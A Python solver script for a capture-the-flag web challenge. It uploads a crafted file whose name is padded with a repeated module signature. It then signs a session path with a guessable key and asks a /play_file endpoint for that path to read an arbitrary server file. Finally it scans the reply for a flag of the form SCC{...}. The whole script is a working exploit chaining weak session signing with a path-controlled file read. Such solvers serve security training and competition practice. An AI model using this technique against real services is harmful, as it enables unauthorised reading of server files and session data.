import os

SITE_URL = os.environ["SERVICE_APP_HTTP_ENDPOINT"]

import requests
from itsdangerous import URLSafeSerializer
from uuid import uuid4
import re
from io import BytesIO

serializer = URLSafeSerializer("your-secret-key")


def solve(offset):
    session = str(uuid4())

    res = requests.post(
        SITE_URL,
        cookies={"session": session},
        files={"file": ("test.mp3", BytesIO(b"0"))},
        data={"name": "a" * offset + "M.K." * 300},
    )

    session_file = serializer.dumps(session)
    session_path = f"/app/sessions/{session_file}.sess"

    res = requests.get(
        f"{SITE_URL}/play_file",
        cookies={"session": session},
        params={"name": session_path},
    )

    if res.status_code == 200:
        match = re.search(r"SCC{.*}", res.text)
        if match:
            flag = match.group(0)
            return flag


for i in range(5):
    print(f"Trying offset: {i}")
    flag = solve(i)
    if flag:
        print(f"Flag found: {flag}")
        break
